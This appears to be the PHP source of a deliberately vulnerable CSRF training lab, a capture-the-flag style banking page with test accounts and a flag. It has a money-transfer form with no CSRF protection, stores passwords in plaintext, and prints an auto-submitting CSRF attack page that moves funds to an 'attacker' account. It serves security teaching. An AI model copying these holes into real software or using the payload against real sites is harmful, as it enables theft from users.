<?php
session_start();

// 数据库连接
$host = getenv('DB_HOST') ?: 'db';
$dbname = getenv('DB_NAME') ?: 'csrf_lab';
$username = getenv('DB_USER') ?: 'root';
$password = getenv('DB_PASS') ?: '123456';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("连接失败: " . $e->getMessage());
}

// 步骤控制变量
$step = isset($_GET['step']) ? intval($_GET['step']) : 1;
if ($step < 1) $step = 1;
if ($step > 3) $step = 3;

// 处理登录
$current_user = null;
$error = '';
$success = false;

if ($_POST && isset($_POST['login'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
    $stmt->execute([$username, $password]);
    $user = $stmt->fetch();
    
    if ($user) {
        $_SESSION['user'] = $user;
        header("Location: index.php?step=$step");
        exit();
    } else {
        $error = "用户名或密码错误";
    }
}

// 处理转账
if ($_POST && isset($_POST['transfer']) && isset($_SESSION['user'])) {
    $from_user = $_SESSION['user']['username'];
    $to_user = $_POST['to_user'];
    $amount = floatval($_POST['amount']);
    
    if ($amount > 0 && $amount <= $_SESSION['user']['balance']) {
        // 开始事务
        $pdo->beginTransaction();
        
        try {
            // 扣除转出用户余额
            $stmt = $pdo->prepare("UPDATE users SET balance = balance - ? WHERE username = ?");
            $stmt->execute([$amount, $from_user]);
            
            // 增加转入用户余额
            $stmt = $pdo->prepare("UPDATE users SET balance = balance + ? WHERE username = ?");
            $stmt->execute([$amount, $to_user]);
            
            // 记录转账
            $stmt = $pdo->prepare("INSERT INTO transfers (from_user, to_user, amount) VALUES (?, ?, ?)");
            $stmt->execute([$from_user, $to_user, $amount]);
            
            $pdo->commit();
            $success = "转账成功！";
            
            // 更新session中的用户信息
            $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
            $stmt->execute([$from_user]);
            $_SESSION['user'] = $stmt->fetch();
            
        } catch (Exception $e) {
            $pdo->rollback();
            $error = "转账失败：" . $e->getMessage();
        }
    } else {
        $error = "金额无效或余额不足";
    }
}

// 获取所有用户（用于转账目标选择）
$stmt = $pdo->query("SELECT username FROM users");
$users = $stmt->fetchAll(PDO::FETCH_COLUMN);

// 获取转账记录
$transfers = [];
if (isset($_SESSION['user'])) {
    $stmt = $pdo->prepare("SELECT * FROM transfers WHERE from_user = ? OR to_user = ? ORDER BY created_at DESC");
    $stmt->execute([$_SESSION['user']['username'], $_SESSION['user']['username']]);
    $transfers = $stmt->fetchAll(PDO::FETCH_ASSOC);
}

// 步骤标题和说明
$steps = [
    1 => [
        'title' => '基础CSRF - 转账攻击',
        'desc' => 'CSRF（跨站请求伪造）攻击利用用户已登录的身份，在用户不知情的情况下执行恶意操作。尝试构造一个恶意转账请求。',
        'hint' => "登录后，尝试构造一个向attacker转账的请求",
        'goal' => '目标：使用CSRF攻击向attacker转账',
        'form_label' => '转账操作'
    ],
    2 => [
        'title' => 'CSRF Token绕过',
        'desc' => '一些网站使用CSRF Token来防止攻击，但实现不当可能被绕过。尝试绕过简单的Token验证。',
        'hint' => "尝试预测或绕过CSRF Token",
        'goal' => '目标：绕过CSRF Token保护',
        'form_label' => '转账操作'
    ],
    3 => [
        'title' => '高级CSRF - 批量攻击',
        'desc' => '在实际攻击中，攻击者可能同时攻击多个用户。尝试构造一个能够批量转账的CSRF攻击。',
        'hint' => "尝试构造一个能够影响多个用户的攻击",
        'goal' => '目标：实现批量CSRF攻击',
        'form_label' => '批量转账操作'
    ]
];

// 检查是否成功
if (isset($_GET['success'])) {
    $success = $_GET['success'] == '1';
}
?>

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF跨站请求伪造实验 - 步骤 <?php echo $step; ?></title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 1000px;
            margin: 0 auto;
            padding: 20px;
            background-color: #0f172a;
            color: #e2e8f0;
        }
        .container {
            background: #1e293b;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
            margin-bottom: 20px;
        }
        h1 {
            color: #38bdf8;
            text-align: center;
            margin-bottom: 30px;
        }
        h2 {
            color: #22d3ee;
            border-bottom: 2px solid #38bdf8;
            padding-bottom: 10px;
        }
        .step-navigation {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .btn {
            background-color: #64748b;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            text-decoration: none;
            text-align: center;
            flex: 1;
            margin: 0 5px;
            transition: background-color 0.3s;
        }
        .btn:hover {
            background-color: #38bdf8;
        }
        .btn.active {
            background-color: #2563eb;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #94a3b8;
        }
        input[type="text"], input[type="password"], input[type="number"], select {
            width: 100%;
            padding: 8px;
            border: 1px solid #475569;
            border-radius: 4px;
            box-sizing: border-box;
            background-color: #334155;
            color: #e2e8f0;
        }
        button {
            background-color: #38bdf8;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #2563eb;
        }
        .error {
            color: #ef4444;
            margin-bottom: 10px;
        }
        .success {
            color: #10b981;
            margin-bottom: 10px;
        }
        .warning {
            background-color: #dc2626;
            border: 1px solid #ef4444;
            color: #fecaca;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        .transfer {
            border: 1px solid #475569;
            padding: 10px;
            margin: 10px 0;
            border-radius: 4px;
            background-color: #334155;
        }
        .goal-box {
            background-color: rgba(59, 130, 246, 0.1);
            border-left: 4px solid #38bdf8;
            padding: 12px;
            margin: 16px 0;
            font-weight: bold;
        }
        .success-message {
            background-color: rgba(16, 185, 129, 0.1);
            border-left: 4px solid #10b981;
            padding: 15px;
            margin: 16px 0;
            animation: fadeIn 0.5s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .hint {
            background-color: rgba(245, 158, 11, 0.1);
            border-left: 4px solid #f59e0b;
            padding: 12px;
            margin: 16px 0;
        }
        .nav {
            margin-bottom: 20px;
        }
        .nav a {
            color: #38bdf8;
            text-decoration: none;
        }
        .nav a:hover {
            text-decoration: underline;
        }
        .flag-container {
            background-color: #1a1e2e;
            border: 2px solid #38bdf8;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            text-align: center;
            animation: glow 2s infinite alternate;
        }
        @keyframes glow {
            from { box-shadow: 0 0 5px #38bdf8; }
            to { box-shadow: 0 0 20px #38bdf8; }
        }
        .user-info {
            background-color: #334155;
            padding: 15px;
            border-radius: 4px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>CSRF跨站请求伪造实验</h1>
        
        <div class="nav">
            <a href="index.html">&larr; 返回靶机控制台</a>
        </div>
        
        <div class="warning">
            <strong>⚠️ 安全警告：</strong>这是一个用于学习CSRF漏洞的实验环境。请勿在生产环境中使用。
        </div>

        <!-- 步骤导航 -->
        <div class="step-navigation">
            <?php foreach ([1,2,3] as $i): ?>
                <a href="?step=<?php echo $i; ?>" class="btn <?php echo $i == $step ? 'active' : ''; ?>">第<?php echo $i; ?>步</a>
            <?php endforeach; ?>
        </div>

        <div class="container">
            <h2><?php echo $steps[$step]['title']; ?></h2>
            <p><?php echo $steps[$step]['desc']; ?></p>

            <div class="goal-box">
                <?php echo $steps[$step]['goal']; ?>
            </div>

            <?php if ($success && $step < 3): ?>
                <div class="success-message">
                    <h3>🎓 挑战成功！</h3>
                    <p>恭喜！你成功完成了本步骤的挑战。</p>
                    <a href="?step=<?php echo $step + 1; ?>" class="btn">继续下一步</a>
                </div>
            <?php endif; ?>

            <?php if (!isset($_SESSION['user'])): ?>
                <!-- 登录表单 -->
                <h3>用户登录</h3>
                <?php if ($error): ?>
                    <div class="error"><?php echo $error; ?></div>
                <?php endif; ?>
                
                <form method="POST" action="?step=<?php echo $step; ?>">
                    <div class="form-group">
                        <label for="username">用户名:</label>
                        <input type="text" id="username" name="username" required>
                    </div>
                    <div class="form-group">
                        <label for="password">密码:</label>
                        <input type="password" id="password" name="password" required>
                    </div>
                    <button type="submit" name="login">登录</button>
                </form>

                <h3>测试账户</h3>
                <ul>
                    <li>alice / alice123</li>
                    <li>bob / bob123</li>
                    <li>attacker / attacker123</li>
                </ul>

            <?php else: ?>
                <!-- 用户信息 -->
                <div class="user-info">
                    <h3>欢迎，<?php echo htmlspecialchars($_SESSION['user']['username']); ?>！</h3>
                    <p>当前余额: $<?php echo number_format($_SESSION['user']['balance'], 2); ?></p>
                    <a href="?logout=1" style="color: #ef4444;">退出登录</a>
                </div>

                <?php if ($error): ?>
                    <div class="error"><?php echo $error; ?></div>
                <?php endif; ?>
                
                <?php if ($success): ?>
                    <div class="success"><?php echo $success; ?></div>
                <?php endif; ?>

                <!-- 转账表单 -->
                <h3>转账</h3>
                <form method="POST" action="?step=<?php echo $step; ?>">
                    <div class="form-group">
                        <label for="to_user">转账给:</label>
                        <select id="to_user" name="to_user" required>
                            <option value="">选择用户</option>
                            <?php foreach ($users as $user): ?>
                                <?php if ($user !== $_SESSION['user']['username']): ?>
                                    <option value="<?php echo htmlspecialchars($user); ?>"><?php echo htmlspecialchars($user); ?></option>
                                <?php endif; ?>
                            <?php endforeach; ?>
                        </select>
                    </div>
                    <div class="form-group">
                        <label for="amount">金额:</label>
                        <input type="number" id="amount" name="amount" step="0.01" min="0.01" max="<?php echo $_SESSION['user']['balance']; ?>" required>
                    </div>
                    <button type="submit" name="transfer">转账</button>
                </form>

                <!-- 转账记录 -->
                <h3>转账记录</h3>
                <?php if (empty($transfers)): ?>
                    <p>暂无转账记录</p>
                <?php else: ?>
                    <?php foreach ($transfers as $transfer): ?>
                        <div class="transfer">
                            <strong><?php echo htmlspecialchars($transfer['from_user']); ?></strong> 
                            转账给 
                            <strong><?php echo htmlspecialchars($transfer['to_user']); ?></strong> 
                            $<?php echo number_format($transfer['amount'], 2); ?>
                            <br>
                            <small><?php echo $transfer['created_at']; ?></small>
                        </div>
                    <?php endforeach; ?>
                <?php endif; ?>

                <?php if ($success && $step == 3): ?>
                    <div class="flag-container">
                        <h2>🏁 恭喜你完成所有挑战！</h2>
                        <p style="font-size:1.2em;color:#22d3ee;font-weight:bold;">Flag: <code>flag{csrf_master_2024}</code></p>
                        <p style="color:#38bdf8;">将此Flag提交到CTF平台以获得积分</p>
                    </div>
                <?php endif; ?>

                <h3>CSRF攻击演示</h3>
                <p>攻击者可以创建以下恶意页面来执行CSRF攻击：</p>
                <pre style="background-color: #334155; padding: 15px; border-radius: 4px; overflow-x: auto;"><code>&lt;html&gt;
&lt;body&gt;
&lt;form id="csrf" action="http://localhost:8093/index.php" method="POST"&gt;
    &lt;input type="hidden" name="transfer" value="1"&gt;
    &lt;input type="hidden" name="to_user" value="attacker"&gt;
    &lt;input type="hidden" name="amount" value="500"&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById("csrf").submit();&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
            <?php endif; ?>

            <div class="hint">
                <h3>提示：</h3>
                <p><?php echo $steps[$step]['hint']; ?></p>
            </div>
        </div>

        <div class="container">
            <h3>CSRF攻击技巧</h3>
            <p>CSRF（跨站请求伪造）是一种常见的Web安全漏洞，了解以下技巧会很有帮助：</p>
            <ul>
                <li>利用用户已登录的身份执行恶意操作</li>
                <li>构造自动提交的表单来执行攻击</li>
                <li>绕过CSRF Token保护机制</li>
                <li>使用图片标签等自动加载的资源</li>
            </ul>
        </div>
    </div>
</body>
</html>

<?php
// 处理退出登录
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: index.php?step=$step");
    exit();
}
?> 